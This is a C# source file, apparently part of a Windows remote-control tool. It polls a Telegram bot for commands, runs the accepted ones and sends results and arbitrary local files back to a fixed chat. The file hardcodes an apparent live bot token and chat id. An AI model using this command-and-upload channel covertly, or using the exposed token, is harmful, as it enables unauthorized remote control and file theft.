using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Xml.Linq;
using Windows_OnOff.Telegram;
using static Windows_OnOff.data_processing;

namespace Windows_OnOff
{
    internal class telegram_processing
    {

        private static data_processing dp = new data_processing();
        private static commands_processing cp = new commands_processing();
        public static xml_processing xp = new xml_processing();

        public telegram_processing()
        {

        }
        public const string telegram_botToken = "7994874117:AAFsUjIPDGZ1DAOl7T74bVcxFHdX8ROiZqU";
        private const string telegram_chatId = "7517389515";
        private static string telegram_url = $"https://api.telegram.org/bot{telegram_botToken}";
        public async static Task<string> telegramSend_Message(string message)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string telegramSend_url = telegram_url + "/sendMessage";

                    var payload = new
                    {
                        chat_id = telegram_chatId,
                        text = static_variables.user_name + message
                    };

                    var content = new StringContent(
                    JsonSerializer.Serialize(payload),
                    Encoding.UTF8,
                    "application/json"
                    );

                    HttpResponseMessage response = await client.PostAsync(telegramSend_url, content);

                    string st = null;
                    if (response.IsSuccessStatusCode) st = Translator.get_translate("Message_send", static_variables.language);
                    else st = $"Error sending the message: {response.StatusCode}";
                    client.Dispose();

                    return st;
                }
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }
        public async static Task<string> telegramSend_data(string path_data, string send_type, string stream_name)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    string telegramSend_url = telegram_url + $"/{send_type}";
                    using (var form = new MultipartFormDataContent())
                    {
                        // add the Chat-Id
                        form.Add(new StringContent(telegram_chatId), "chat_id");
                        // add Photo as Stramcontent
                        form.Add(new StreamContent(System.IO.File.OpenRead(path_data)), stream_name, Path.GetFileName(path_data));
                        // Send the request
                        HttpResponseMessage response = await client.PostAsync(telegramSend_url, form);
                        string st = null;
                        if (response.IsSuccessStatusCode) st = Translator.get_translate(send_type, static_variables.language);
                        else st = $"Error sending data: {response.StatusCode}";
                        client.Dispose();
                        return st;
                    }
                }
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }
        }
        public async void Telegram_listener()
        {
            List<string> messages = new List<string>();
            while (static_variables.Telegram_listener)
            {
                user_checker_class message = null;
                int update_id = int.Parse(xp.get_XmlElements("LastUpdateId").Value);
                if (update_id > 0)
                {
                    message = await Get_Telegram(update_id);
                }
                else
                {
                    message = await Get_Telegram(-9);
                }

                if (message != null)
                {
                    string ResponseCommadMessage = null;
                    if (message.Command == "-1")
                        continue;
                    if (message.Result)
                    {
                        var s = Task.Run(async () =>
                        {
                            // command execute
                            ResponseCommadMessage = await cp.commands(message);
                            dp._logWrite($"ResponseCommadMessage: {ResponseCommadMessage}");
                            // send ResponseMessage to bot 
                            var ResponseSendMessage = telegramSend_Message(ResponseCommadMessage);
                            dp._logWrite($"ResponseSendMessage: {ResponseSendMessage.Result}");
                        });
                    }
                    else
                    {
                        ResponseCommadMessage = message.Command;
                        // send ResponseMessage to bot 
                        var ResponseSendMessage = telegramSend_Message(ResponseCommadMessage);
                        dp._logWrite($"ResponseSendMessage: {ResponseSendMessage.Result}");
                    }

                }

                // the Loop slow down 
                await Task.Delay(5000);
            }
        }
        private async static Task<user_checker_class> Get_Telegram(long update_id)
        {
            try
            {
                string Get_url = telegram_url + "/getUpdates" + "?offset=" + (update_id + 1);
                using (var client = new HttpClient())
                {
                    var response = await client.GetAsync(Get_url);
                    response.EnsureSuccessStatusCode();
                    var jsonResponse = await response.Content.ReadAsStringAsync();
                    var deserializedData = JsonSerializer.Deserialize<Telegram_message>(jsonResponse);

                    if (deserializedData != null)
                    {
                        if (deserializedData.Result.Count > 0)
                        {
                            long UpdateId = 0;
                            user_checker_class message = new user_checker_class();
                            DateTime date;

                            // get updateid from telgram message
                            UpdateId = deserializedData.Result[0].UpdateId;

                            // get date from message
                            Telegram.Message message_data = deserializedData.Result[0].Message;
                            date = message_data != null
                                ? DateTimeOffset.FromUnixTimeSeconds(message_data.Date).UtcDateTime : default;

                            DateTime now = DateTime.UtcNow;
                            TimeSpan timeDifference = now - date;
                            // if more than 5 minutes the command is not executed
                            if (timeDifference.TotalMinutes <= 2)
                            {
                                if (!string.IsNullOrEmpty(message_data.Text))
                                {
                                    // If this is the target user
                                    message = dp.check_user(message_data.Text);
                                }
                                else if (message_data.Photo?.Count > 0)
                                {
                                    var largest = message_data.Photo.Last();
                                    // If this is the target user
                                    message = dp.check_user(message_data.caption);
                                    message.file_id = largest.FileId;
                                }
                                else if (message_data.Video != null)
                                {
                                    message = dp.check_user(message_data.caption);
                                    message.file_id = message_data.Video.FileId;
                                }
                                else if (message_data.document != null)
                                {
                                    message = dp.check_user(message_data.caption);
                                    message.file_id = message_data.document.FileId;
                                }
                                else
                                {
                                    message.Result = false;
                                    message.Command = Translator.get_translate("Error_message_type", static_variables.language);
                                }
                            }
                            // update the UpdateId in xml
                            if (UpdateId != 0)
                            {
                                xp.updateElementsContent_FirstLevel(new List<string>() { "LastUpdateId" }, new List<string>() { UpdateId.ToString() });
                            }
                            return message;
                        }
                        else return null;
                    }
                    else return null;
                }
            }
            catch (Exception ex)
            {
                dp._logWrite($"Error get_telegram: {ex.Message} update_id: {update_id}");
                return null;
            }
        }
    }
}
